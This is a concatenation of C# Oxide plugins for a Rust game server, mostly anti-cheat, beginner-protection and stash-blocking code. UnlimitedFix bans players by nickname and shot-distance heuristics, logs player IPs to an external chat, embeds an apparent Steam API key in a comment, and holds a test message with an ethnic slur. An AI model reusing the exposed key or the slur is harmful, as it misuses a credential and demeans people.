⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠⁠")]
        private void OnBasePlayerAttacked(BasePlayer player, HitInfo hitInfo)
        {
            if (player.IsDead()) return;
            if (hitInfo.Initiator == null) return;
            if (player.health - hitInfo.damageTypes.Total() > 0f) return;
            BasePlayer attacker = hitInfo.Initiator.ToPlayer();
            if (attacker == null) return;
            if (attacker == player) return;
            WallhackKillCheck(player, attacker, hitInfo);
        }
        public static void msgPlayer(BasePlayer player, string msg)
        {
            player.ChatMessage($"[Анти-Чит] {msg}");
        }
        public static void msgAll(string msg)
        {
            ConsoleNetwork.BroadcastToAllClients("chat.add", 0, $"[Анти-Чит] {msg}");
        }
        private void CreateInfo(BasePlayer player)
        {
            if (player == null) return;
            if (!PlayersListed.ContainsKey(player.userID)) PlayersListed.Add(player.userID, new PlayerAntiCheat()
            {
                Deaths = 0,
                Killed = 0,
                Heads = 0,
                Hits = 0,
                Name = player.displayName
            }
            );
        }
        private void SaveDataAdmin()
        {
            Interface.GetMod().DataFileSystem.WriteObject("AntiCheat/AdminData", adata);
        }
        private void SavePlayerData()
        {
            Interface.Oxide.DataFileSystem.WriteObject("AntiCheat/PlayerAntiCheat", PlayersListed);
        }
        void SendDetection(BasePlayer player, string msg)
        {
            if (SendsLogs) if (permission.UserHasPermission(player.UserIDString, "anticheat.sendlogs")) SendReply(player, msg);
        }
        public Dictionary<ulong, PlayerAntiCheat> PlayersListed = new Dictionary<ulong, PlayerAntiCheat>();
        public class PlayerAntiCheat
        {
            public string Name
            {
                get;
                set;
            }
            public int Killed
            {
                get;
                set;
            }
            public int Deaths
            {
                get;
                set;
            }
            public int Hits
            {
                get;
                set;
            }
            public int Heads
            {
                get;
                set;
            }
            public bool Banned;
            public string Date;
            public string Reason;
            public string BanCreator;
        }
    }
}

// --- End of file: AntiCheat.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/BeginnerProtection.cs ---
// --- Original Local Path: BeginnerProtection.cs ---

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Oxide.Rust.Libraries;
using Oxide.Core.Plugins;

namespace Oxide.Plugins
{
    [Info("Beginner Protection", "Kation", "0.1.2", ResourceId = 910)]
    public class BeginnerProtection : RustPlugin
    {
        private Dictionary<string, string> message = new Dictionary<string, string>()
        {
            {"DoNotAttack", "He is a beginner, he has no guns, don't attack the beginner."},
            {"CanNotAttack", "You are a beginner, you can not attack anyone until you have a gun."},
            {"DoNotAttackSleeped", "Do not attack someone when he was slept."},
            {"DoNotLoot", "You can not loot anything from a sleeping player."},
            {"Enabled", "Beginner Protection is enabled."},
            {"Disabled", "Beginner Protection is disabled."},
            {"ConfigMissing", "Config missing."},
            {"Reloaded", "Beginner gift reloaded."},
            {"Usage", "Usage:"},
            {"ItemName", "item name"},
            {"Amount", "amount"},
            {"ItemNotExist", "Item does not exist."},
            {"AmountInvalid", "Amount value invalid."},
            {"GiftSetSuccess", "Set gift success."}
        };
        private Dictionary<string, object> setting = new Dictionary<string, object>()
        {
            {"IsEnabled", true},
            {"SleepAttack", false},
            {"SleepLoot", false}
        };
        private Dictionary<string, int> gift = new Dictionary<string, int>()
        {
            {"camp fire", 1},
            {"cooked wolf meat", 2},
            {"small water bottle", 1},
            {"stone hatchet", 1},
            {"wood", 200}
        };
        private Dictionary<string, string> nameTable;

        [ChatCommand("bp")]
        private void bpCommand(BasePlayer player, string cmd, string[] args)
        {
            if (args.Length == 0)
            {
                if ((bool)setting["IsEnabled"])
                    player.ChatMessage(message["Enabled"]);
                else
                    player.ChatMessage(message["Disabled"]);
            }
            else
            {
                if (player.net.connection.authLevel == 0)
                    return;
                if (args[0].ToLower() == "true")
                {
                    setting["IsEnabled"] = true;
                    Config["Settings"] = setting;
                    SaveConfig();
                    player.ChatMessage(message["Enabled"]);
                }
                else if (args[0].ToLower() == "false")
                {
                    setting["IsEnabled"] = false;
                    Config["Settings"] = setting;
                    SaveConfig();
                    player.ChatMessage(message["Disabled"]);
                }
            }
        }

        [ChatCommand("bp.gift.reload")]
        private void giftReloadCommand(BasePlayer player, string cmd, string[] args)
        {
            if (player.net.connection.authLevel == 0)
                return;
            LoadConfig();
            Dictionary<string, object> gc = Config["Gifts"] as Dictionary<string, object>;
            if (gc != null)
            {
                gift = gc.Where(t => t.Value is int &&
                    (int)t.Value > 0 &&
                    nameTable.ContainsKey(t.Key.ToLower()) &&
                    ItemManager.FindItemDefinition(nameTable[t.Key.ToLower()]) != null).ToDictionary(t => t.Key.ToLower(), t => (int)t.Value);
            }
            else
            {
                player.ChatMessage(message["ConfigMissing"]);
                return;
            }
            player.ChatMessage(message["Reloaded"]);
        }

        [ChatCommand("bp.gift.set")]
        private void giftAddCommand(BasePlayer player, string cmd, string[] args)
        {
            if (args.Length != 2)
            {
                player.ChatMessage(message["Usage"]);
                player.ChatMessage("/bp.gift.set \"[" + message["ItemName"] + "]\" [" + message["Amount"] + "]");
                return;
            }
            var itemname = args[0].ToLower();
            if (!nameTable.ContainsKey(itemname))
            {
                player.ChatMessage(message["ItemNotExist"]);
                return;
            }
            int amount;
            if (!int.TryParse(args[1], out amount))
            {
                player.ChatMessage(message["AmountInvalid"]);
                return;
            }
            if (amount < 0)
            {
                if (gift.ContainsKey(itemname))
                    gift.Remove(itemname);
            }
            else
            {
                if (gift.ContainsKey(itemname))
                    gift[itemname] = amount;
                else
                    gift.Add(itemname, amount);
            }
            Config["Gifts"] = gift;
            SaveConfig();
            player.ChatMessage(message["GiftSetSuccess"]);
        }

        [HookMethod("OnServerInitialized")]
        private void OnServerInitialized()
        {
            LoadConfig();

            Dictionary<string, object> mc = Config["Messages"] as Dictionary<string, object>;
            if (mc != null)
                foreach (var key in message.Keys.ToArray())
                {
                    if (mc.ContainsKey(key))
                        message[key] = mc[key].ToString();
                }
            Dictionary<string, object> sc = Config["Settings"] as Dictionary<string, object>;
            if (sc != null)
                foreach (var key in setting.Keys.ToArray())
                {
                    if (sc.ContainsKey(key))
                    {
                        object value = sc[key];
                        value = Convert.ChangeType(value, setting[key].GetType());
                        setting[key] = value;
                    }
                }
            nameTable = ItemManager.GetItemDefinitions().ToDictionary(t => t.displayName.english.ToLower(), t => t.shortname.ToLower());

            Dictionary<string, object> gc = Config["Gifts"] as Dictionary<string, object>;
            if (gc != null)
                gift = gc.Where(t => t.Value is int &&
                    (int)t.Value > 0 &&
                    nameTable.ContainsKey(t.Key.ToLower()) &&
                    ItemManager.FindItemDefinition(nameTable[t.Key.ToLower()]) != null).ToDictionary(t => t.Key.ToLower(), t => (int)t.Value);

            Config.Clear();
            Config["Settings"] = setting;
            Config["Messages"] = message;
            Config["Gifts"] = gift;
            SaveConfig();
        }

        protected override void LoadDefaultConfig()
        {
            Config.Clear();
            Config["Settings"] = setting;
            Config["Messages"] = message;
            Config["Gifts"] = gift;
            SaveConfig();
        }

        [HookMethod("OnPlayerAttack")]
        private object OnPlayerAttack(BasePlayer attacker, HitInfo hitInfo)
        {
            if ((bool)setting["IsEnabled"])
            {
                if (hitInfo.HitEntity != null && hitInfo.HitEntity is BasePlayer)
                {
                    BasePlayer target = (BasePlayer)hitInfo.HitEntity;
                    if (!(bool)setting["SleepAttack"] && target.HasFlag(BaseEntity.Flags.Locked))
                    {
                        SendReply(attacker, message["DoNotAttackSleeped"]);
                        return true;
                    }
                    if (!target.inventory.AllItems().Any(t => t.GetHeldEntity() is BaseProjectile))
                    {
                        SendReply(attacker, message["DoNotAttack"]);
                        return true;
                    }
                    target = attacker;
                    if (!target.inventory.AllItems().Any(t => t.GetHeldEntity() is BaseProjectile))
                    {
                        SendReply(attacker, message["CanNotAttack"]);
                        return true;
                    }
                }
            }
            return null;
        }

        [HookMethod("OnPlayerRespawned")]
        private void OnPlayerRespawned(BasePlayer player)
        {
            foreach (var item in gift)
            {
                var definition = ItemManager.FindItemDefinition(nameTable[item.Key]);
                player.inventory.GiveItem(ItemManager.CreateByItemID((int)definition.itemid, item.Value, false), player.inventory.containerMain);
            }
        }

        [HookMethod("OnPlayerDisconnected")]
        private void OnPlayerDisconnected(BasePlayer player)
        {
            PluginTimers timer = new PluginTimers(this);
            timer.Once(10, () =>
            {
                player.SetFlag(BaseEntity.Flags.Locked, true);
            });
        }

        [HookMethod("OnPlayerSleepEnded")]
        private void OnPlayerSleepEnded(BasePlayer player)
        {
            player.SetFlag(BaseEntity.Flags.Locked, false);
        }

        [HookMethod("OnPlayerLoot")]
        private void OnPlayerLoot(PlayerLoot lootInventory, BaseEntity targetEntity)
        {
            if ((bool)setting["IsEnabled"])
            {
                if (targetEntity is BasePlayer)
                {
                    BasePlayer targetPlayer = (BasePlayer)targetEntity;
                    if (!(bool)setting["SleepLoot"] && targetPlayer.HasFlag(BaseEntity.Flags.Locked))
                    {
                        BasePlayer player = lootInventory.GetComponent<BasePlayer>();
                        player.ChatMessage(message["DoNotLoot"]);
                        NextTick(() =>
                        {
                            player.EndLooting();
                        });
                    }
                }
            }
        }
    }
}


// --- End of file: BeginnerProtection.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/BlockStashPlacement.cs ---
// --- Original Local Path: BlockStashPlacement.cs ---

using System.Collections.Generic;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("BlockStashPlacement", "Flaymar", "1.0.2", ResourceId = 2060)]
    [Description("Blocks small stash placement!")]
    public class BlockStashPlacement : RustPlugin
    {
        void Loaded(){
            lang.RegisterMessages(messages, this);
        }

        Dictionary<string, string> messages = new Dictionary<string, string>()
        {
            {"MayNotPlace", "Deploying stashes is not enabled on this server!"},
        };
        void OnEntitySpawned(BaseEntity entity, GameObject gameObject)
        {
            if (entity is StashContainer) 
            {
                var stash = entity.GetComponent<StashContainer>(); 
                var player = BasePlayer.FindByID(stash.OwnerID);
                if (player != null)
                {
                    SendReply(player, lang.GetMessage("MayNotPlace", this, player.UserIDString));
                    player.inventory.GiveItem(ItemManager.CreateByItemID(1051155022));
                }
                stash.DieInstantly();                             
            }
        }
    }
}

// --- End of file: BlockStashPlacement.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/UnlimitedFix.cs ---
// --- Original Local Path: UnlimitedFix.cs ---

using System;
using System.Collections.Generic;
using Network;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using UnityEngine;

namespace Oxide.Plugins
{
	[Info("UnlimitedFix", "Ryamkk", "2.0.5")]
	public class UnlimitedFix : RustPlugin
	{
		private Dictionary<BaseEntity, HitInfo> lastHitInfo = new Dictionary<BaseEntity, HitInfo>();
		
		[JsonProperty("Список запрещённых команд на сервере")]
		List<string> blacklistCMD = new List<string>()
		{
			"oxide.plugins",
			"o.reload",
			"o.unload",
			"o.load",
			"o.plugins",
			//"giveto",
			"plugins",
			"global.plugins",
			"oxide.load",
			"global.load",
			"oxide.reload",
			"global.reload",
			"oxide.unload",
			"global.unload",
			"oxide.grant",
			"global.grant",
			"oxide.group",
			"global.group",
			"oxide.revoke",
			"global.revoke",
			"oxide.show",
			"global.show",
			"oxide.usergroup",
			"global.usergroup",
			"oxide.version",
			"global.ownerid"
		};
		
		[JsonProperty("Список запрещённых ников на сервере")]
		private List<List<string>> ForbiddenWords = new List<List<string>>()
		{
			new List<string>() {"U-N-L-I-M-I-T-E-D"},
			new List<string>() {"UNLIMITED"},
			new List<string>() {"UNLIMITED HACK"},
			new List<string>() {"unlimited hack"},
			new List<string>() {"H-A-C-K"},
			new List<string>() {"unlimited_hack"},
			new List<string>() {"unlimited-hack"},
			new List<string>() {"vk.com/unlimited_hack"},
			new List<string>() {"unlimited-hack.cf"},
			new List<string>() {"unlimited-hack.pw"},
			new List<string>() {"[ U-N-L-I-M-I-T-E-D | H-A-C-K ]"},
			new List<string>() {"[ U-N-L-I-M-I-T-E-D| H-A-C-K ]"},
			new List<string>() {"[ U-N-L-I-M-I-T-E-D |H-A-C-K ]"},
			new List<string>() {"Ass#6143"},
			new List<string>() {"azp2033#2743"},
			new List<string>() {"KorolkovTeam"},
			new List<string>() {"Prota#7232"},
			new List<string>() {"arfinov"},
			new List<string>() {"1290"},
			new List<string>() {"UBER-RUST"},
			new List<string>() {"Unlimited Hack"},
			new List<string>() {"Unlimited"}
		};
		
		[JsonProperty("Дата файл репортов на игроков")]
		public Dictionary<ulong, NumberDetectData> NumberDetectUser = new Dictionary<ulong, NumberDetectData>();

		public class NumberDetectData
		{
			[JsonProperty("Количество детектов за большое расстояние")] public int ProjectileDistanceMore;
			[JsonProperty("Количество детектов за фейковое расстояние")] public int FakeDistance;
			[JsonProperty("Количество детектов за использование SilentAim")] public int SilentAim;
		}
		
		void ReadData()
		{
			NumberDetectUser = Core.Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, NumberDetectData>>("UnlimitedFix/UnlimitedFixData");
		}
            
		void WriteData()
		{
			Core.Interface.Oxide.DataFileSystem.WriteObject("UnlimitedFix/UnlimitedFixData", NumberDetectUser);
		}
        
		void RegisteredDataUser(BasePlayer player)
		{
			if (!NumberDetectUser.ContainsKey(player.userID))
			{
				NumberDetectUser.Add(player.userID, new NumberDetectData
				{
					ProjectileDistanceMore = 0,
					FakeDistance = 0,
				});
			}
		}


		private void Unload()
		{
			//SendVKLogs($"Сервер: STORM RUST 236 DEV - MAIN\n UnlimitedFix( ПЕРВЫЙ СЕРВЕРНЫЙ АНТИ-ЧИТ ) unloaded");
			WriteData();
		}

		private void OnServerInitialized()
		{
			ReadData();
			SendVKLogs("Сервер: STORM RUST 236 DEV \n Сервер запущен");
			/*SendVKLogs("Initialized.")*/
			foreach (var player in BasePlayer.activePlayerList)
			{
				RegisteredDataUser(player);
			}
		}
		
		void OnPlayerInit(BasePlayer player)
		{
			RegisteredDataUser(player);
		}
		
		private object OnServerCommand(ConsoleSystem.Arg arg)
		{
			if (arg == null || arg.Connection == null || arg.cmd == null) return null;

			if (blacklistCMD.Contains(arg.cmd.FullName))
			{
				SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {arg.Connection.username} ({arg.Connection.userid}) ({arg.Connection.ipaddress.Split(':')[0]}) ввёл консольную команду {arg.cmd.FullName}");
				return true;
			}

			return null;
		}

		private object OnUserApprove(Connection connection)
		{
			foreach (var words in ForbiddenWords)
			{
				foreach (var word in words)
				{
					if (connection.username == word)
					{
						ConnectionAuth.Reject(connection, "Вы забанены на этом сервере, причина: Чит");
						connection.rejected = true;

						SendVKLogs($" Сервер: STORM RUST - 236\n Игрок {connection.username} ({connection.userid}) был заблокирован за попытку зайти с запрещённым ником {word}");
					}
				}
			}

			return null;
		}

		private void PlayerBanForbiddenWords(BasePlayer player, string message)
		{
			SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {player.displayName} ({player.userID}) был заблокирован за отправленное сообщение: {message}");
			Server.Command($"ban {player.userID} \"Вы забанены на этом сервере, причина: Чит\"");
		}

		private void OnPlayerChat(ConsoleSystem.Arg arg)
		{
			var player = arg.Player();
			var message = arg.GetString(0, "text").Trim();

			if (player == null) return;
			if (arg.Args == null || arg.Args.Length == 0) return;

			foreach (var words in ForbiddenWords)
			{
				int cnt = 0;
				foreach (var word in words)
					cnt = message.Contains(word) ? cnt + 1 : 0;

				if (words.Count == cnt && cnt > 0)
				{
					timer.Once(0.1f, () => PlayerBanForbiddenWords(player, message));
					return;
				}
			}
		}

		private object OnPlayerDie(BasePlayer player, HitInfo info)
		{
			BasePlayer target = info?.HitEntity as BasePlayer;
			
			if (info == null)
			{
				if (lastHitInfo.TryGetValue(player, out info) == false)
				{
					return null;
				}
			}
			
			if (player != null || target != null || info != null || info.InitiatorPlayer != null)
			{
				float Distance = Vector3.Distance(info.InitiatorPlayer.transform.position, target.transform.position);
				float ProjectileDistance = info.ProjectileDistance;
				float CheckFakeDistance = ProjectileDistance - Distance;

				//string url = $"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?" +
				             //$"key=9F6382327AC5261B6402A13BE0248E7A&steamids={info.InitiatorPlayer.UserIDString}&personalname&format=json";
				
				string ActiveItem = info.InitiatorPlayer.GetActiveItem().info.displayName.english;
				string BoneName = info.boneName;

				if (ProjectileDistance > 350f)
				{
					NumberDetectUser[info.InitiatorPlayer.userID].ProjectileDistanceMore += 1; 
					WriteData();
					
					if (NumberDetectUser[info.InitiatorPlayer.userID].ProjectileDistanceMore >= 3)
					{
						Server.Command($"ban {info.InitiatorPlayer.userID} \"Вы забанены на этом сервере, причина: Чит\"");
					}
				}
				
				if (CheckFakeDistance > 10)
				{
					SendVKLogs($"На сервере {ConVar.Server.hostname}\n" +
					           $"\nИгрок {info.InitiatorPlayer.displayName} убил игрока {target.displayName}\n" +
					           $"SteamID Убийцы: {info.InitiatorPlayer.UserIDString}\n" +
					           $"Используя оружие: {ActiveItem}\n" +
					           $"Попал в: {BoneName}\n" +
					           $"Настоящие расстояние: {Distance}\n" +
					           $"Фейковое расстояние: {ProjectileDistance}");
					
					NumberDetectUser[info.InitiatorPlayer.userID].FakeDistance += 1; 
					WriteData();
					
					if (NumberDetectUser[info.InitiatorPlayer.userID].FakeDistance >= 8)
					{
						Server.Command($"ban {info.InitiatorPlayer.userID} \"Вы забанены на этом сервере, причина: Чит\"");
					}
				}
				
				if (ProjectileDistance > 200f)
				{
					if(info.InitiatorPlayer.userID == 76561198357402326) return null;
					
					SendVKLogs($"На сервере {ConVar.Server.hostname}\n" +
					           $"\nИгрок {info.InitiatorPlayer.displayName} убил игрока {target.displayName}\n" +
					           $"SteamID Убийцы: {info.InitiatorPlayer.UserIDString}\n" +
					           $"Используя оружие: {ActiveItem}\n" +
					           $"Попал в: {BoneName}\n" +
					           $"Расстояние убийства: {ProjectileDistance}");
				}

				foreach (var words in ForbiddenWords)
				{
					foreach (var word in words)
					{
						if (info.InitiatorPlayer.displayName == word)
						{
							Server.Command($"ban {info.InitiatorPlayer.userID} \"Вы забанены на этом сервере, причина: Чит\"");
						}
					}
				}

				/*webrequest.EnqueueGet(url, (code, response) =>
				{
					JObject InfoResponse = JObject.Parse(response);
					foreach (var item in InfoResponse["response"]["players"])
					{
						DateTime date = new DateTime(1970, 1, 1, 0, 0, 0, 0).AddSeconds(Convert.ToDouble(item["timecreated"]));

						if (info.InitiatorPlayer.displayName != item["personaname"].ToString())
						{
							SendVKLogs($"На сервере {ConVar.Server.hostname}\n" +
							           $"\nИгрок {info.InitiatorPlayer.displayName} убил игрока {victim.ToPlayer().displayName} " +
							           $"используя оружие {info.InitiatorPlayer.GetActiveItem().info.displayName.english}\n" +
							           $"\nУ игрока {info.InitiatorPlayer.displayName} отличается ник на сервере.\n" +
							           $"Расстояние убийства: {ProjectileDistance}\n" +
							           $"Его настоящий ник в стиме: {item["personaname"]}\n" +
							           $"Его настоящий Steam ID: {item["steamid"]}\n" +
							           $"Его настоящий IP addres: {info.InitiatorPlayer.net.connection.ipaddress.Split(':')[0]}\n" +
							           $"Дата создания аккаунта: {date}\n" +
							           $"\nСсылка на его Steam Profile:\n{item["profileurl"]}");
							return;
						}
					}
				}, this);*/
			}
			
			return null;
		}

		[ConsoleCommand("testvk")]
		void testvk(ConsoleSystem.Arg args)
		{
			SendVKLogs($"ТЕСТОВОЕ СООБЩЕНИЕ ПРИШЛО СУДЫ,А НЕКИЙ КИРИЛЛ БАКЛАНОВ ХОХОЛ РУССКИЙ");
		}

		private void OnPlayerAttack(BasePlayer attacker, HitInfo info)
		{
		    BasePlayer target = info?.HitEntity as BasePlayer;

		    if (target != null)
		    {
		        float distance = Vector3.Distance(attacker.transform.position, target.transform.position);
		        float _distance = info.ProjectileDistance;
		        float Distance = distance - _distance;
		        
		        //float CheckFakePlayerModelV1 = Vector3.Distance(target.transform.position, info.HitPositionWorld);
		        //float CheckFakePlayerModelV2 = info.HitEntity.Distance2D(info.HitPositionWorld);
		        
		        //SendVKLogs($"Игрок {attacker.displayName} тест1: {CheckFakePlayerModelV1}, тест2: {CheckFakePlayerModelV2}");

		        if (Distance > 35f || Distance < -35f)
		        {
		            SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {attacker.displayName} ({attacker.UserIDString}) подозревается в использовании SilentAim #1");
		            NumberDetectUser[info.InitiatorPlayer.userID].SilentAim += 1; 
		            WriteData();
		            
		            if (NumberDetectUser[info.InitiatorPlayer.userID].SilentAim >= 5)
		            {
			            SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {attacker.displayName} ({attacker.UserIDString}) был заблокирован за использование SilentAim #1");
			            Server.Command($"ban {attacker.UserIDString} \"Вы забанены на этом сервере, причина: Чит\"");
		            }
		        }
		        
		        if (_distance < 1f && distance > 6f)
		        {
		            SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {attacker.displayName} ({attacker.UserIDString}) подозревается в использовании SilentAim #2");
		            NumberDetectUser[info.InitiatorPlayer.userID].SilentAim += 1; 
		            WriteData();
		            
		            if (NumberDetectUser[info.InitiatorPlayer.userID].SilentAim >= 8)
		            {
			            SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {attacker.displayName} ({attacker.UserIDString}) был заблокирован за использование SilentAim #2");
			            Server.Command($"ban {attacker.UserIDString} \"Вы забанены на этом сервере, причина: Чит\"");
		            }
		        };
		        
		        if (info.HitEntity.Distance(target) < 15f) return;
		        
		        if (Mathf.Abs(info.HitPositionWorld.y - info.HitEntity.CenterPoint().y) >= 2.05f)
		        {
		            SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {attacker.displayName} ({attacker.UserIDString}) подозревается в использовании SilentAim #3");
		            NumberDetectUser[info.InitiatorPlayer.userID].SilentAim += 1; 
		            WriteData();
		            
		            if (NumberDetectUser[info.InitiatorPlayer.userID].SilentAim >= 8)
		            {
			            SendVKLogs($"Сервер: STORM RUST - 236\n Игрок {attacker.displayName} ({attacker.UserIDString}) был заблокирован за использование SilentAim #3");
			            Server.Command($"ban {attacker.UserIDString} \"Вы забанены на этом сервере, причина: Чит\"");
		            }
		        }
		    }
		}

		private string URLEncode(string input)
        {
            if (input.Contains("#")) input = input.Replace("#", "%23");
            if (input.Contains("$")) input = input.Replace("$", "%24");
            if (input.Contains("+")) input = input.Replace("+", "%2B");
            if (input.Contains("/")) input = input.Replace("/", "%2F");
            if (input.Contains(":")) input = input.Replace(":", "%3A");
            if (input.Contains(";")) input = input.Replace(";", "%3B");
            if (input.Contains("?")) input = input.Replace("?", "%3F");
            if (input.Contains("@")) input = input.Replace("@", "%40");
            return input;
        }
        
